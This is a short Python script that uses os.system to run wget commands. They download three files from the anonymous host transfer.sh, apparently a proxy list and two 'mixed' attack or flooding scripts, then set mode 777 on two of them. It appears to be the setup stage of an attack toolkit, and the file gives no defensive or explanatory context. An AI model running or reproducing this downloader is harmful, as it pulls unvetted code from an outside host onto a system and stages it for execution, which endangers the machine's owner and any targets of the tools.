import os

commands = """wget https://transfer.sh/5fAx5V/mixedv8
wget https://transfer.sh/RjaA7I/proxy.txt
wget https://transfer.sh/AQ7byg/mixedv16.js
chmod 777 mixedv8
chmod 777 mixedv16.js"""

for i in commands.splitlines():
    os.system(i)